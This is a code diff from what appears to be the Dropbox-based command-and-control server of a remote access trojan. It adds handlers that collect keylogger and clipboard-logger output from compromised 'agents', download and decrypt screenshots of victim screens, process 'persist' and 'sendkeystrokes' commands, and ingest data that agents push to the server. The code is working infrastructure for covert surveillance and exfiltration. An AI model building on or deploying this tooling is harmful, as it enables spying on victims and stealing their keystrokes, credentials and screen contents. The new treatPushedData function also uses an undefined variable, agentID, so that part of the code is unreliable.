@@ -39,26 +39,20 @@ class PollingThread:
 		# Error handling
 		if result is None:
 			proceed = False
-		elif cmd != "runCLI" or cmd != "runModule":
+		elif cmd not in ['runCLI', 'runModule']:
 			if result.startswith("ERROR"):
 				print helpers.color("\n[!] Task ID [{}] on agent ID [{}] failed with error: [{}]".format(taskID, agentID, result))
 				proceed = False
 
 		# Proceed with task result treatment
 		if proceed:			
-			if cmd == "runCLI":
-					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed".format(taskID, agentID))
-					print "[{}]".format(task['cmd'])
-					print ""
-					print result
-			
-			if cmd == "runModule":
+			if cmd in ['runCLI', 'runModule']:
 					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed".format(taskID, agentID))
 					print "[{}]".format(task['cmd'])
 					print ""
 					print result
 						
-			elif cmd == "launchProcess":
+			elif cmd in ['launchProcess', 'polling', 'sendkeystrokes', 'persist']:
 					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))
 					
 			elif cmd == "getFile":
@@ -70,9 +64,9 @@ class PollingThread:
 				with open(localFile, 'w+') as fileHandle:
 					fileHandle.write(Crypto.decryptData(self.dropboxHandler.readFile(result, resultFormat="bytes"), self.statusHandler.masterKey))
 					fileHandle.close()
+				print helpers.color("[*] File saved [{}]".format(localFile))
 				# Delete the remote file
 				self.dropboxHandler.deleteFile(result)
-				print helpers.color("[*] File saved [{}]".format(localFile))
 				
 			elif cmd == "sendFile":
 				print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))
@@ -83,10 +77,44 @@ class PollingThread:
 				self.statusHandler.setAgentAttribute(agentID, "status", "SLEEPING")
 				print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))
 				print helpers.color("[*] Agent is going to sleep")
+			
+			elif cmd == "keylogger":
+				if args[0] == "stop":
+					localFile = os.path.join(cfg.defaultPath['incoming'], "keylogger.txt")
+					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully".format(taskID, agentID))
+					print helpers.color("[*] Saving keylogger results to file [{}]".format(localFile))
+					with open(localFile, 'w+') as fileHandle:
+						fileHandle.write(result)
+						fileHandle.close()
+					print helpers.color("[*] File saved [{}]".format(localFile))
+				else:
+					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))
 
-			elif cmd == "polling":
+			elif cmd == "clipboardlogger":
+				if args[0] == "stop":
+					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully".format(taskID, agentID))
+					localFile = os.path.join(cfg.defaultPath['incoming'], "clipboardlogger.txt")
+					
+					print helpers.color("[*] Saving clipboard logger results to file [{}]".format(localFile))
+					with open(localFile, 'w+') as fileHandle:
+						fileHandle.write(result)
+						fileHandle.close()
+					print helpers.color("[*] File saved [{}]".format(localFile))
+				else:
+					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))
+
+			elif cmd == "screenshot":
+				# Compute a local file name based on the agent file name
+				localFile = os.path.join(cfg.defaultPath['incoming'], "screenshot.jpg")
 				print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))
-		
+				print helpers.color("[*] Please wait while downloading file [{}] and saving it to [{}]".format(result,localFile))
+				with open(localFile, 'w+') as fileHandle:
+					fileHandle.write(Crypto.decryptData(self.dropboxHandler.readFile(result, resultFormat="bytes"), self.statusHandler.masterKey))
+					fileHandle.close()
+				print helpers.color("[*] File saved [{}]".format(localFile))
+				# Delete the remote file
+				self.dropboxHandler.deleteFile(result)
+
 			elif cmd == "stop":
 				self.statusHandler.setAgentAttribute(agentID, "status", "DEAD")
 				self.dropboxHandler.deleteFile(self.statusHandler.getAgentAttribute(agentID, "statusFile"))
@@ -98,6 +126,20 @@ class PollingThread:
 		
 		# Delete the task result file on the server
 		self.dropboxHandler.deleteFile(taskResultFilePath)
+
+	#------------------------------------------------------------------------------------
+	def treatPushedData(self, pushedDataFilePath):
+		# Read the pushed data result file
+		result = Crypto.decryptData(self.dropboxHandler.readFile(pushedDataFilePath, resultFormat="bytes"), self.statusHandler.masterKey)
+
+		# Error handling
+		if result is None:
+			print helpers.color("\n[!] Error retrieving data pushed by the agent ID [{}]".format(agentID))
+		else:
+			print result
+
+		# Delete the push result file on the server
+		self.dropboxHandler.deleteFile(pushedDataFilePath)
 
 	#------------------------------------------------------------------------------------
 	def doPoll(self):
@@ -207,7 +249,12 @@ class PollingThread:
 						else:
 							self.statusHandler.addModule(moduleName, "NONE")
 							print helpers.color("[!] Published module [{}] doesn't seem to be shared with a public link".format(entry['name']))
-							
+				
+				#-----------------------------------------------------------------------------------------------
+				# Looking for ".push" extension's files representing a push of data initiated by the agent
+				elif entry['name'].endswith(".dd"):
+					self.treatPushedData(entry['path_lower'])
+
 				#-----------------------------------------------------------------------------------------------
 				# Check for tasks resulting files
 				else:
@@ -219,4 +266,4 @@ class PollingThread:
 
 		# Eventually, re-enable the polling thread
 		if self.pollingThreadEnabled:
-			threading.Timer(self.pollingPeriod, self.doPoll).start()
+			threading.Timer(self.statusHandler.pollingPeriod, self.doPoll).start()
